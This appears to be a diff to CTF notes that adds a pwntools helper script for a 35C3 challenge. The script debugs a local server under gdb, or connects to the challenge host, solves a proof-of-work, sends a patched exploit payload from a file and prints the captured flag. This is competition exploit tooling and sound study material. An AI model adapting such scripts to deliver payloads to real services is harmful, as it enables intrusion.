@@ -1,4 +1,4 @@
-# Web
+# web
 
 ## PHP
 
@@ -285,4 +285,46 @@ input()
 print(a.get('a'))
 #.index(0x100))
 END_OF_PWN
+```
+
+And a helper script:
+```python
+#!/usr/bin/python
+
+from pwn import *
+from subprocess import check_output as co
+
+# 35C3_l1st_equiv4lency_is_n0t_l15t_equ4l1ty
+
+f = open("test.py",'r')
+
+if len(sys.argv) < 2:
+	r = process(["/usr/bin/python2.7","server.py"])
+	gdb.attach(r,"""
+		catch exec
+		c
+		c
+		b *0x42a54a
+		c
+	""")
+	r.sendline(f.read())
+	r.interactive()
+else:
+	r = remote("35.207.157.79",4444)
+	r.recvuntil("challenge: ")
+	prooftitle = r.recvline(False)
+	log.info("acquiring POW solution")
+	s = co(["./pow.py","{}".format(prooftitle)])
+	solution = s.split('\n')[-2].split(": ")[-1]
+	log.info("solution: {}".format(solution))
+	r.sendlineafter("response? ",solution)
+	payload = f.read().replace("-0x5000","+0x12000")
+	r.send(payload)
+	r.recvuntil("[768]")
+	r.recvline(False)
+	flag = r.recv(64)
+	log.info(flag)
+	r.close()
+
+f.close()
 ```
